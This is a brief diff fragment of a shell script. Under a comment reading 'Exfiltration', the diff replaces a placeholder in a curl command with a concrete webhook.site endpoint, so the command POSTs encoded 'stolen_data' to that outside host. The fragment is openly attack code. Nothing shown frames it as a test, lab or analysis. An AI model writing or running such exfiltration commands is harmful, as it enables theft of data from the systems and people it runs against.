@@ -32,7 +32,7 @@ else
 
     # 2. Exfiltration
 
-    curl -X POST -d "stolen_data=$ENCODED" https://webhook.site/{your_id_here}
+    curl -X POST -d "stolen_data=$ENCODED" https://webhook.site/52a5bf9f-393e-4ad4-931a-75b520a5ac72
 
    
 
